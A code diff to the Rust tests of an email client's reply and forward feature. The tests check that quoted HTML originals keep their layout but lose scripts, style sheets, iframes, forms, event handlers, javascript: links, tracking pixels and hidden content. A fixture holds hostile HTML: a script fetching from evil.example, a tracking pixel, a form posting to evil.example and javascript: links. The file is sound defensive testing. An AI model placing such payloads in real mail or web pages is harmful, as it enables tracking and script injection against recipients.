@@ -1,5 +1,6 @@
-//! Replies and forwards of HTML mail: the original goes out below the owner's text as it came,
-//! a draft keeps it, and a plain-text original is still quoted in the body.
+//! Replies and forwards of HTML mail: the original goes out below the owner's text with its look
+//! and without anything in it that runs, embeds or tracks, a draft keeps it, and a plain-text
+//! original is still quoted in the body.
 
 use std::sync::Arc;
 
@@ -52,7 +53,7 @@ fn newsletter(s: &mut Session) -> Id {
 }
 
 #[test]
-fn a_reply_carries_the_original_html_as_it_came() {
+fn a_reply_carries_the_original_html_with_its_look() {
     let mut s = session();
     let id = newsletter(&mut s);
     run(&mut s, "mail.reply", json!({"id": id}));
@@ -62,8 +63,10 @@ fn a_reply_carries_the_original_html_as_it_came() {
     // The owner's text is only theirs (and the signature); the original is below, not in it.
     assert!(!c.body.plain().contains("Original Message") && !c.body.plain().contains("arrivals"));
     assert!(q.html.starts_with(QUOTE_MARK));
-    assert!(q.html.contains(&format!("<style>.col{{width:50%}}</style>{BODY}")), "{}", q.html);
-    // Its header lines are escaped; the original's own markup is not touched.
+    // Its layout, classes, inline styles and picture are carried; its head and style sheet are not.
+    assert!(q.html.contains(BODY), "{}", q.html);
+    assert!(!q.html.contains("<style") && !q.html.contains(".col{"), "{}", q.html);
+    // Its header lines are escaped.
     assert!(
         q.html.contains("<b>From:</b> &quot;Harbor &lt;News&gt; &amp; Co&quot; &lt;news@news.example&gt;")
             || q.html.contains("<b>From:</b> Harbor &lt;News&gt; &amp; Co"),
@@ -97,6 +100,59 @@ fn a_reply_carries_the_original_html_as_it_came() {
     let wire = String::from_utf8_lossy(&bytes);
     assert!(wire.contains("multipart/related") && wire.contains("Content-ID: <logo@news.example>"), "{wire}");
     assert!(s.mailbox.message(id).unwrap().answered);
+}
+
+/// An original that tries to run, track and hide things, with a picture of its own in each place.
+const HOSTILE: &str = "<html><head><style>body{background:url(https://evil.example/bg.gif)}</style>\
+<script>fetch('https://evil.example/open')</script></head><body onload=\"x()\">\
+<p onclick=\"steal()\" style=\"color:#336\">Kept <a href=\"javascript:alert(1)\">link</a> \
+<a href=\"https://shop.example/\">shop</a></p>\
+<img src=\"https://evil.example/pixel.gif\" width=\"1\" height=\"1\"><img src=\"cid:logo@news.example\" alt=\"logo\">\
+<div style=\"display:none\">hidden <img src=\"cid:secret@news.example\"></div>\
+<script>document.write('<img src=cid:written@news.example>')</script>\
+<iframe src=\"https://evil.example/frame\"></iframe><form action=\"https://evil.example/c\"><input name=a></form></body></html>";
+
+#[test]
+fn a_reply_carries_nothing_that_runs_tracks_or_was_hidden() {
+    let mut s = session();
+    let id = newsletter(&mut s);
+    let secret = Attachment { content_id: "secret@news.example".into(), inline: true, ..Attachment::new("secret.png", "image/png", vec![137, 80]) };
+    s.mailbox.message_mut(id).unwrap().attachments.push(secret);
+    s.mailbox.message_mut(id).unwrap().body.html = Some(HOSTILE.into());
+    run(&mut s, "mail.reply", json!({"id": id}));
+    let q = compose(&s).quote.clone().unwrap();
+    let lower = q.html.to_ascii_lowercase();
+    for gone in ["<script", "<style", "<iframe", "<form", "<input", "onload", "onclick", "javascript:", "pixel.gif", "evil.example", "hidden"] {
+        assert!(!lower.contains(gone), "{gone}: {}", q.html);
+    }
+    for kept in [
+        "<p style=\"color:#336\">Kept <a>link</a> <a href=\"https://shop.example/\">shop</a></p>",
+        "<img src=\"cid:logo@news.example\" alt=\"logo\">",
+    ] {
+        assert!(q.html.contains(kept), "{kept}: {}", q.html);
+    }
+    // Only the picture the quote still shows goes with the reply, not the hidden one.
+    assert_eq!(q.pictures.iter().map(|a| a.name.as_str()).collect::<Vec<_>>(), ["logo.png"]);
+    let sent = run(&mut s, "compose.send", json!({}))["id"].as_u64().unwrap();
+    let html = s.mailbox.message(sent).unwrap().body.html.clone().unwrap().to_ascii_lowercase();
+    assert!(!html.contains("<script") && !html.contains("evil.example") && !html.contains("onclick"), "{html}");
+}
+
+#[test]
+fn a_draft_carrying_an_original_as_it_came_reopens_without_its_scripts() {
+    let mut s = session();
+    let id = newsletter(&mut s);
+    // A draft from an older MailCraft, or from anywhere: the original below the mark as it came.
+    let drafts = s.mailbox.folder_of_kind(s.mailbox.accounts[0].id, FolderKind::Drafts).unwrap();
+    let mut draft = s.mailbox.message(id).unwrap().clone();
+    draft.folder = drafts;
+    draft.draft = true;
+    draft.body.html =
+        Some(format!("<html><body><p>Mine</p>{QUOTE_MARK}<b>From:</b> x<br><script>alert(1)</script><p onclick=y>Theirs</p></div></body></html>"));
+    let d = s.mailbox.add_message(draft).unwrap();
+    run(&mut s, "mail.editDraft", json!({"id": d}));
+    let q = compose(&s).quote.clone().unwrap();
+    assert_eq!(q.html, format!("{QUOTE_MARK}<b>From:</b> x<br><p>Theirs</p></div>"));
 }
 
 #[test]
@@ -187,6 +243,10 @@ fn originals_of_any_shape_are_carried_without_panicking() {
         "<html><head><style>a</style>",
         "é<body\u{0}>ü</body>",
         "<body>\r\nBcc: x@example.org\r\n</body>",
+        "<script>",
+        "<div hidden>",
+        "<img src=cid:",
+        "<a href=\"javascript:",
     ] {
         let id = newsletter(&mut s);
         s.mailbox.message_mut(id).unwrap().body.html = Some(html.into());
